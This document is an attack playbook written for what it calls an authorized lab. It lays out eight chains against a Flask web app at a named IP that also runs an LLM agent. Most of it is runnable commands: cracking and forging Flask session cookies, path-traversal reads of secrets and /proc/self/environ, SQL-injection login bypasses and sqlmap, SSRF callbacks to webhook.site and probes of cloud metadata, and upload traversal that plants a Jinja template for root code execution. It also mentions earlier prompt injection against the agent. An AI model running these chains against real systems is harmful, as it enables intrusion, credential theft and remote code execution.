# Alternative attack chains — Atelier (18.217.39.191)

Authorized SIT lab. Run from the group's registered attacking box (42.60.142.138).
These bypass the LLM agent entirely and target the Flask app, its session layer,
its data layer, and the container. Scope rules unchanged: no DoS, don't destroy
data, keep the box up, document-and-stop on any AWS-account pivot.

**Why these exist:** every prior vector went through `/api/chat`. The app has its
own auth, DB, file handling, and dependencies — each a separate road to the same
uid-0 container. Several are faster than prompt injection.

Run this recon pre-pass first; its output decides which chains are live:

```bash
# exact dependency versions (feeds the CVE chain)
curl -skI http://18.217.39.191/           # Server: Werkzeug/x Python/x
curl -sk  http://18.217.39.191/health

# is source or VCS exposed? ("forgot to clear the docker" -> very likely)
for p in .git/config .git/HEAD .env app.py main.py wsgi.py requirements.txt \
         app.py.bak "app.py~" .DS_Store docker-compose.yml Dockerfile backup.zip \
         server.py config.py settings.py; do
  printf "%-22s " "$p"
  curl -sk -o /dev/null -w "%{http_code} %{size_download}B\n" "http://18.217.39.191/$p"
done

# what does 443 serve? different vhost? internal names in the cert?
curl -skI https://18.217.39.191/
echo | openssl s_client -connect 18.217.39.191:443 2>/dev/null \
  | openssl x509 -noout -text 2>/dev/null | grep -A1 'Subject Alternative Name'

# hidden routes beyond what we know
ffuf -u http://18.217.39.191/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,401,403 -c
```

---

## Chain 1 — Flask session forgery via a weak SECRET_KEY  ★ top pick

Flask session cookies are **signed, not encrypted**. If the app's `SECRET_KEY` is a
default, a dev placeholder, or crackable (overwhelmingly likely for a box whose
authors "forgot to clear the docker"), you can forge any session you want —
including an admin/staff one — with no LLM involved.

**Step 1 — grab your cookie and look at it**
```bash
# after logging in (jar.txt), print the session cookie
grep -i session jar.txt
# decode it — Flask sessions are base64 segments joined by dots:
python3 -c "import sys,zlib,base64,json;
c=sys.argv[1].split('.')[0];
c+='='*(-len(c)%4);
d=base64.urlsafe_b64decode(c);
d=zlib.decompress(d[1:]) if d[:1]==b'.' else d;
print(d)" "$(grep -i session jar.txt | awk '{print $NF}')"
```
Now you know what the session holds — likely `user_id`, maybe `username`, maybe a
role field. That tells you exactly what to flip.

**Step 2 — crack the key**
```bash
pip install flask-unsign                       # if not present
SESS=$(grep -i session jar.txt | awk '{print $NF}')
flask-unsign --unsign --cookie "$SESS" \
  --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
# also try flask-unsign's built-in common-key list:
flask-unsign --unsign --cookie "$SESS"
```

**Step 3 — forge an elevated session**
```bash
# whatever Step 1 revealed — flip the role / swap to user_id 1 (usually first/admin):
flask-unsign --sign --secret '<CRACKED_KEY>' \
  --cookie "{'user_id': 1, 'username': 'admin', 'is_admin': True, 'account_type': 'staff'}"
# drop the forged value into the jar and hit a privileged route:
curl -sk -b "session=<FORGED_COOKIE>" http://18.217.39.191/account | grep -i 'account type'
```

**To root:** an admin/staff session usually unlocks staff-only pages — and those
are where file management, ticket admin, or "run a report" features live. Any one
of those that touches the filesystem or a template is your exec sink. Also: user_id
1 is typically the author's own account, which per the chat leak holds the answers.

---

## Chain 2 — Arbitrary file read (path traversal)  ★ enables everything else

One file-read primitive hands you the source (so you stop guessing at sinks), the
`SECRET_KEY` (so Chain 1 becomes trivial), the env, and the flag. The photo-serve
endpoint is the prime suspect because it maps an id/name to a file on disk.

**Step 1 — probe the photo retrieval path**
```bash
# the upload is POST /api/tickets/{id}/photo — find the GET that serves it back,
# then abuse whatever identifies the file:
for t in \
  "/api/tickets/1/photo?file=../../../../etc/passwd" \
  "/api/tickets/1/photo?name=../../app/app.py" \
  "/static/../app/app.py" \
  "/static/..%2f..%2fapp%2fapp.py" \
  "/static/%2e%2e/%2e%2e/etc/passwd" ; do
  echo "== $t =="; curl -skb jar.txt "http://18.217.39.191$t" | head -5
done
```

**Step 2 — if any param reflects file contents, read the crown jewels**
```bash
for f in /app/app.py /app/main.py /app/wsgi.py /app/config.py \
         /app/.env /proc/self/environ /proc/1/environ \
         /etc/passwd /root/.bash_history /app/agent.py /app/tools.py; do
  echo "===== $f ====="; curl -skb jar.txt "http://18.217.39.191/<vuln-endpoint>?file=$f"
done
```
`/proc/self/environ` leaks `SECRET_KEY`, DB path, and any API keys baked into the
container env. `/app/app.py` + `/app/tools.py` reveal the real injection sink and
the agent's system prompt. **This is often the whole game.**

---

## Chain 3 — SQL injection in the web forms (not the LLM tools)

The team's "no tools for sql execution" is about the *agent*. The app's own forms —
login, registration, ticket search, product filters — build their own queries.

**Step 1 — auth bypass + boolean/error probes**
```bash
# login bypass attempts:
for u in "admin' -- -" "admin'/*" "' OR '1'='1' -- -" "admin' OR 1=1 -- -"; do
  echo "== $u =="
  curl -sk -c /tmp/sqli.jar -L http://18.217.39.191/login \
    --data-urlencode "username=$u" --data-urlencode "password=x" \
    -o /dev/null -w "%{http_code} -> %{redirect_url}\n"
done

# reflected error / boolean on any id or search param:
curl -skb jar.txt "http://18.217.39.191/products?id=1'"
curl -skb jar.txt "http://18.217.39.191/products?id=1%20AND%201=1"
curl -skb jar.txt "http://18.217.39.191/products?id=1%20AND%201=2"
```

**Step 2 — hand it to sqlmap on the real parameter**
```bash
sqlmap -u "http://18.217.39.191/products?id=1" --cookie="$(grep -i session jar.txt|awk '{print $NF}')" \
  --batch --level 3 --risk 2 --dbms sqlite
```

**To root:** SQLite can't stack-exec OS commands, but if the app is misconfigured
you may `ATTACH DATABASE` to write a file into a web/template dir, or you simply
dump the users table (password hashes, the admin row) and pivot to Chain 1 /
credential reuse against SSH.

---

## Chain 4 — SSRF → internal services

Look for any feature that fetches a URL server-side: avatar-from-URL, image import,
link preview, a webhook field. The health JSON names `ollama` — the app talks to an
internal service you may be able to reach indirectly.

**Step 1 — find a fetcher**
```bash
# try common URL-accepting fields on account/ticket/profile:
curl -skb jar.txt -X PUT http://18.217.39.191/api/account \
  -H 'Content-Type: application/json' \
  -d '{"avatar_url":"http://webhook.site/<TOKEN>/ssrf-probe","email":"pentest1@test.invalid"}'
# watch webhook.site for a hit coming FROM the target's AWS IP
```

**Step 2a — Ollama "Probllama" (CVE-2024-37032) if you can reach :11434**
```
# Ollama < 0.1.34 has a path-traversal in model pull -> arbitrary file write -> RCE.
# If an SSRF reaches http://127.0.0.1:11434 you can hit its API directly.
# First just confirm reachability and version:
#   SSRF target: http://127.0.0.1:11434/api/version
```

**Step 2b — EC2 metadata (DISCOVER AND STOP)**
```
# SSRF target: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# If this returns a role name + temp creds, that is a high-value FINDING.
# DOCUMENT it (screenshot the response) and STOP. Using the creds = operating in
# someone else's AWS account, outside the assigned scope.
```

---

## Chain 5 — Upload path traversal → write a template → SSTI RCE

Flask won't execute an uploaded `.py` from a static dir, so a dropped web shell
dies (that's why the teammate's "reverse shell" failed and the ticket deleted).
But if the upload filename isn't run through `secure_filename()`, you can traverse
*out* of the upload dir and write into the **templates** directory — and anything
Jinja later renders there executes server-side as root.

**Step 1 — test filename traversal on the photo upload**
```bash
# craft a tiny valid image, then send it with a traversing filename:
python3 tools/make_payload_image.py --payload "ssti marker" -o /tmp/x.jpg
curl -skb jar.txt \
  -F 'file=@/tmp/x.jpg;filename=../../app/templates/pwn.html' \
  http://18.217.39.191/api/tickets/1/photo
# then see if it landed and renders:
curl -skb jar.txt http://18.217.39.191/pwn
```

**Step 2 — if writes land, write a Jinja RCE template instead**
```bash
printf '%s' '{{ cycler.__init__.__globals__.os.popen("id").read() }}' > /tmp/pwn.html
curl -skb jar.txt -F 'file=@/tmp/pwn.html;filename=../../app/templates/pwn.html' \
  http://18.217.39.191/api/tickets/1/photo
curl -skb jar.txt http://18.217.39.191/pwn      # expect uid=0
```
Swap `id` for a webhook.site callback if the render output isn't reflected.

---

## Chain 6 — Leaked source / secrets  (the "forgot to clear the docker" chain)

The defenders told you the answers are still in the image. Look for what leaked out
through the web root (covered in the recon pre-pass) and parse anything you get:

```bash
# if /.git/ is exposed, rip the whole repo:
pip install git-dumper
git-dumper http://18.217.39.191/.git/ ./atelier-src
grep -riE 'secret_key|password|api[_-]?key|flag|token' ./atelier-src

# .env or config leaks the SECRET_KEY -> straight into Chain 1
curl -sk http://18.217.39.191/.env
```
A leaked `SECRET_KEY` collapses this straight into admin via Chain 1; leaked source
hands you the exact sink and the flag.

---

## Chain 7 — Known CVEs against the pinned stack

Pin the exact versions (recon pre-pass), then match:

- **Werkzeug 3.0.4 debugger** — console was off, but re-confirm `debug=True` isn't
  on via an error traceback; if it is, the PIN is derivable from readable files
  (machine-id, the app module path) → interactive Python console as root.
- **Pillow** — if the version is old and the app calls `ImageMath.eval`
  (CVE-2023-50447) or an ImageMagick delegate (ImageTragick), a crafted upload
  execs. Fingerprint the version via error messages / behaviour on malformed files.
- **Ollama** — CVE-2024-37032 (Probllama) path-traversal RCE if < 0.1.34, reachable
  via Chain 4's SSRF.

```bash
searchsploit werkzeug 3; searchsploit pillow; searchsploit ollama
```

---

## Chain 8 — SSH (port 22) as the finish line, not the start

22 is filtered/`tcpwrapped`, so no direct brute force. But the web chains above feed
it: a password hash cracked from Chain 3, a key found in Chain 2 (`/root/.ssh/`,
`/home/*/.ssh/`), or creds in Chain 6's source. If the app DB reuses the host
account's password, or you read a private key, 22 becomes a clean root login — and
a persistent one, which the web-shell path isn't (uploaded files get deleted).

---

## Priority order

1. **Recon pre-pass** — versions, `/.git/`, `/.env`, 443, hidden routes. Decides everything.
2. **Chain 1** (session forgery) — fastest standalone win if the key is weak.
3. **Chain 2** (file read) — if it fires, read source + SECRET_KEY and you've won twice over.
4. **Chain 6** (leaked source) — the defenders practically announced this one.
5. **Chain 3** (SQLi) — forms, not the LLM.
6. **Chain 5** (upload traversal → template SSTI) — the real "image RCE" the team half-found.
7. **Chain 4** (SSRF) — pivots to Ollama RCE or an AWS finding (document-and-stop).
8. **Chain 7/8** — CVE match and SSH as the durable finish.

All roads end at the same place: one command run inside a root Docker container.
First command after any exec is always `id; cat /app/*.py` — confirm uid 0 and read
their source before anything else.
